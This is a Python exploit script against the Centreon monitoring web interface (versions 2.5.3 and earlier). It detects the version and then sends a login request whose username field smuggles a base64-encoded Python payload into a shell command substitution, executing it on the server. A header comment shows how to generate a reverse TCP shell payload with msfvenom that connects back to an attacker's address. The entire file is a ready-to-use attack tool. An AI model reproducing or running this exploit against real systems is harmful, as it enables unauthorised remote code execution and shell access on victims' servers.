#!/usr/bin/python3
########################################################################################################
# Important: Generate the payload with msfvenom first eg: 
# msfvenom --platform python -a python -p python/shell_reverse_tcp LHOST=192.168.92.134 LPORT=4445 -f raw -o payload.py
########################################################################################################
import sys
import base64
import requests
import random
import string
import re
from distutils.version import StrictVersion
import argparse

def randomString(length):
  return (''.join(random.choice(string.ascii_letters) for m in range(length)))

def check(url):
	res = requests.get(url + '/index.php')
	block = re.search('LoginInvitVersion"><br \/>[\s]+(?P<version>[\d]{1,2}\.[\d]{1,2}\.[\d]{1,2})[\s]+<\/td>',res.text)
	
	if block:
		ver = block.group('version')
		
		if StrictVersion(ver) <= StrictVersion('2.5.3'):
			print("Version Detected: " + ver)
			print("Target is vulnerable, proceeding...")
			return True
		else:
			print("Target not vulnerable, exiting...")
			return False
	
	else:
		print("Could not connect to the web service")

def check_payload(py_path):
	try:
		f = open(py_path,'r')
		f.close
		return True
	except IOError:
		print("Python payload file not found, exiting...")
		return False

def main(URL,py_path):

	if not check(URL):
		return 1
	if not check_payload(py_path):
		return 1	

	f = open(py_path,'r')
	payload = f.read()

	# Encode to base64
	payload_encoded = base64.b64encode(payload.encode())

	# Convert back to string
	new_payload = payload_encoded.decode('utf-8')

	# Generate login username and password
	useralias = "$(echo " + new_payload + " |base64 -d | python)\\"
	password = randomString(5)

	hdrs = {
		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	login = { 
		'useralias': useralias,
		'password': password
	} 

	try:
		print("Sending malicious login")
		requests.post(URL + '/index.php',data=login,headers=hdrs)
	except requests.exceptions.ConnectionError as err:
		print("Could not connect to the web service" + '\n' + str(err))

	return 0

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser._action_groups.pop()
	required = parser.add_argument_group('Required arguments')
	required.add_argument('-url',help='URL of the Centreon login eg. http://192.168.92.152/centreon',required=True)
	required.add_argument('-py',help='Path to Python payload eg. payload.py in working dir',required=True)
	args = parser.parse_args()
	sys.exit(main(args.url,args.py))
